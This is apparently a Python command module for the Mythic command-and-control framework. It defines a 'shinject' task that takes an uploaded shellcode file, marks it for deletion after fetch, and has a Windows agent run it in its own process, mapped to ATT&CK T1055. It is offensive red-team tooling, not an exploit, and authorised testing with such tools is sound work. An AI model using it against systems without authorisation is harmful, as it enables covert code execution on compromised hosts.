from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from mythic_container.MythicGoRPC import (
    SendMythicRPCFileSearch,
    MythicRPCFileSearchMessage,
)
import json


class ShinjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="shellcode",
                cli_name="Shellcode",
                display_name="Shellcode File",
                type=ParameterType.File,
                description="Shellcode file to execute",
                parameter_group_info=[ParameterGroupInfo(required=True, group_name="Default")],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments provided.")
        if self.command_line[0] != "{":
            raise Exception("Expected JSON input, e.g. {'shellcode': <file_id>}")
        self.load_args_from_json_string(self.command_line)


class ShinjectCommand(CommandBase):
    cmd = "shinject"
    needs_admin = False
    help_cmd = "shinject (modal popup)"
    description = "Execute shellcode in the current process using a separate thread."
    version = 3
    author = "OFSTeam"
    argument_class = ShinjectArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        file_id = task.args.get_arg("shellcode")

        file_resp = await SendMythicRPCFileSearch(
            MythicRPCFileSearchMessage(TaskID=task.id, AgentFileId=file_id)
        )

        if not file_resp or not file_resp.Success or len(file_resp.Files) == 0:
            raise Exception("Shellcode file not found. Upload a valid shellcode file.")

        f = file_resp.Files[0]
        task.args.add_arg("shellcode-file-id", f.AgentFileId)
        task.args.remove_arg("shellcode")

        await MythicRPC().execute(
            "update_file",
            file_id=f.AgentFileId,
            task_id=task.id,
            delete_after_fetch=True,
            comment="Shellcode prepared for injection",
        )

        file_size = getattr(f, 'Size', getattr(f, 'size', getattr(f, 'ChunkSize', 0)))
        task.display_params = f"Executing {f.Filename} ({file_size} bytes) in current process"
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        try:
            response_text = response if isinstance(response, str) else json.dumps(response)
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=response_text.encode(),
                )
            )
        except Exception as e:
            resp.Success = False
            resp.Error = str(e)
        return resp
